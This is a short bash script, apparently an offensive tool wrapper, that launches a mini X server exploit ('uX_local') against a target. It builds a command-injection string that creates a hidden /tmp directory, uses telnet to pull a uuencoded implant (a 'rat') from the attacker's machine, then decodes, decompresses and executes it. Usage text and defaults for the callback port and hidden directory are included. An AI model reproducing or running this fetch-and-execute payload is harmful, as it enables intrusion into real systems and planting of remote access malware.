#!/bin/bash
echo -e "\n\n\n\n\nYOU REALLY SHOULD BE USING ys.auto or better yet -sploit



BUT IF YOU MUST USE $0 at least use /current/bin/nc.YS instead of just nc.


Packrat now has an option to do just that:

packrat -n /current/bin/nc.YS


"

sleep 4

usage ()
{
echo "Usage: ${0}
	-l [ IP of attack machine (NO DEFAULT) ]
	-r [ name of rat on target (NO DEFAULT) ]
	-p [ call back port DEFAULT = 32177 ]
	-x [ port to start mini X server on DEFAULT = 12121 ]
	-d [ directory to work from/create on target DEFAULT = /tmp/.X11R6]"

echo "example: ${0} -l 192.168.1.1 -p 22222 -r nscd -x 9999 -d /tmp/.strange"
}

DIR=0
XPORT=0
CALLBACK_PORT=0

if [ $# -lt 4 ]
then
	usage
	exit 1
fi

while getopts hl:p:r:d:x: optvar
	do
	        case "$optvar"
	        in
			h)
			   usage
			   exit 1
			   ;;
		        l) LOCAL_IP=${OPTARG} 
			   ;;
		        p) CALLBACK_PORT=${OPTARG}
			   ;;
		        r) RAT=${OPTARG} 
			   ;;
			x) XPORT=${OPTARG}
			   ;;
			d) DIR=${OPTARG}
			   ;;
		        *) echo "invalid option"
			   usage
			   exit 1
			   ;;
		esac
	done

if [ ${DIR} = 0 ]
then
	DIR="/tmp/.X11R6"
fi

if [ ${XPORT} = 0 ]
then
	XPORT=12121
fi

if [ ${CALLBACK_PORT} = 0 ]
then
	CALLBACK_PORT=32177
fi

echo
echo "########################################"
echo "Local IP = ${LOCAL_IP}"
echo "Call back port = ${CALLBACK_PORT}"
echo "Name of Rat = ${RAT}"
echo "Starting mini X server on port ${XPORT}"
echo "Directory to create/use = ${DIR}"
echo "########################################"
echo

VENDOR_STR="\`mkdir ${DIR} 2>&1;cd ${DIR} 2>&1 && /usr/bin/telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>&1 </dev/console > ${RAT}.uu; uudecode ${RAT}.uu 2>&1 > /dev/null 2>&1 && uncompress -f ${RAT}.Z;chmod 0700 ${RAT} && export PATH=.; ${RAT} \`"

./uX_local -e "${VENDOR_STR}" -v -p ${XPORT} -c xxx
